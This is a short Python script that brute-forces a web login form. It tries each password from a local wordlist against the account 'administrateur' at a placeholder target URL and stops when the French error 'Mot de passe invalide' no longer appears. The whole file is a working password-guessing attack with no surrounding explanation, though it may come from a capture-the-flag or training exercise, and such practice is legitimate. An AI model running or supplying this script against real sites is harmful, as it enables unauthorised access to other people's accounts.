#!/usr/bin/python
#coding:utf-8

import requests

# Define your target as an url
url = 'target'
# Use the wordlist you have chosen
exploit = open('C:\\Users\\Wilder\\Desktop\\mywordlist', 'r')

# Try in a loop every word
for words in exploit:
    password = words.strip()
    # Set the params
    http =  requests.get(url, params={'login':'administrateur','pass' :password, 'submit':'Connection' })
    content = http.content
    # Set the changing content on the website
    if b'Mot de passe invalide' in content:
        print("invalid password " + password )
    else:
        print(password)
        break
